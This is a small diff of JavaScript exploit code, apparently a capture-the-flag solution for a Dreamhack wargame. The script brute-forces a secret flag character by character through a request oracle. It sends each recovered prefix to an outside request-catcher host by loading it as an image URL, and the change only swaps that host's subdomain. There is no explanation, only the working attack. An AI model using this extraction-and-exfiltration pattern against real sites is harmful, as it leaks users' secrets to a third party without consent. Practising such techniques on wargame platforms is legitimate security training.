@@ -37,7 +37,7 @@
                 if(await sendrequest(flag+ch)) {
                     flag += ch;
                     var img = document.getElementById("img");
-                    img.src = "https://btnelbb.request.dreamhack.games/?"+flag;
+                    img.src = "https://nnxcfpn.request.dreamhack.games/?"+flag;
                     break;
                 }
             }
